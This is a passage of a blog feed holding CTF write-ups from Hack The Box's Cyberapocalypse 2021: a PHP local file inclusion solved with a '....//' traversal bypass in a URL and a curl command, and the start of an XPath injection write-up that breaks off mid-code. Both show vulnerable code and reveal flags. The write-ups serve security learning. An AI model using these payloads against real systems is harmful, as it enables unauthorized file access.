d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>From the source code, we can see that this is a PHP application, and we can inspect the <code>index.php</code> file.</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;header&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;meta name='author' content='bertolis, makelaris'&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;title&gt;Ministry of Defence&lt;/title&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;link rel="stylesheet" href="/static/css/main.css"&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   &gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/header&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;div class="language"&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;a href="?lang=en.php"&gt;EN&lt;/a&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;a href="?lang=qw.php"&gt;QW&lt;/a&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/div&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $lang = ['en.php', 'qw.php'];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/html&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h3>
<p>We see&nbsp;from the PHP file, that the query param <code>lang</code> will include a file from the filesystem. Its main use is to provide us with language support by using either <code>en.php</code> or <code>qw.php</code> as language files, but we see other uses for it - namely <strong>local file inclusion</strong>.</p>
<p>The only problem, is that there is a <code>str_replace</code> method being called, which removes any string of the form <code>../</code> from the query. But we need <code>../</code> to get to the root directory, where the flag is.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>Since <code>str_replace</code> will run through our string only once, all we need to do is supply a buffer to the string <code>../</code> by making it for example into <code>....//</code> or  <code>.../...//</code>, or anything similar to that.</p>
<p>So, all we have to do is navigate to the following url</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://&lt;vulnerablesite:port&gt;/?lang=....//....//flag</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Or, if we want to be cheeky, we can script this by running</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> http://</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">vulnerablesite:port</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/?lang</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">//</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">//flag </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">.*</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--color</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">none</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To directly get our flag as output</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{b4d_4li3n_pr0gr4m1ng}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[E.Tree - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the E.Tree challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We are provided with an XML file, which indicate where the flag will be hidden</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token prolog" style="color:#999988;font-style:italic">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">military</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">district</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">confidential</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[REDACTED]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">CHTB{f4k3_fl4g</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">district</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">district</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">confidential</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">_f0r_t3st1ng}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">age</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">rank</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">confidential</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">kills</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">staff</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">district</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">military</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We also have access to a site, which has a form connected to a POST endpoint  <code>/api/search</code>. Giving it a string value would return either that it has found an entry or not.</p>
<p>It gets interesting though, if we pass to it something which starts with an apostrphe <code>'</code>. If we pass that through Burpsuite for example, we will receive a response, that we've broken the application, with a very nice detailed error log.</p>
<p><img loading="lazy" alt="error log" src="https://kblagoev.com/assets/images/xpath-error-6e3897b2c502fa8e57ab239c383a78ec.png" width="781" height="938" class="img_ev3q"></p>
<p>This log reveals to us that the application is running Flask, but also more importantly it gives us the query (in fact the whole function) that it's running to respond to our POST request.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#### File "/app/app.py", line _42_, in `search`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:#393A34">@app</span><span class="token decorator annotation punctuation" style="color:#393A34">.</span><span class="token decorator annotation punctuation" style="color:#393A34">route</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"/api/search"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> methods</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">\</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"POST"</span><span class="token plain">\</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> request</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"search"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">""</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> query </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"/military/district/staff\[name='{}'\]"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> tree</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xpath</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">query</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 	</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">"success"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" 